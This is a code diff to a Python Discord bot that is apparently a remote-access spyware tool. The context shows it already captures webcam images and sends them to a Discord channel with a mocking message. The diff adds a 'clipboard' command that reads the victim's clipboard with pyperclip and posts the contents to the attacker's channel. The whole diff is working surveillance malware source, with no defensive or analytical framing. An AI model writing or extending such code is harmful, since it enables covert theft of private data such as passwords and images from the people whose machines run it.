@@ -14,6 +14,7 @@ import logging
 import asyncio
 from PIL import ImageGrab
 import cv2
+import pyperclip
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -212,6 +213,19 @@ async def webcam(ctx):
             content="See da pretty face",
             files=[discord.File(io.BytesIO(img_bytes), filename="webcam.png")]
         )
+
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+@bot.command()
+async def clipboard(ctx):
+    try:
+        clipboard_content = pyperclip.paste()  # Get copeid thing
+        
+        if not clipboard_content:
+            await ctx.send("Clipboard is empty.")
+        else:
+            await ctx.send(f"Clipboard content:\n```\n{clipboard_content}\n```")
 
     except Exception as e:
         await ctx.send(f"Error: {e}")
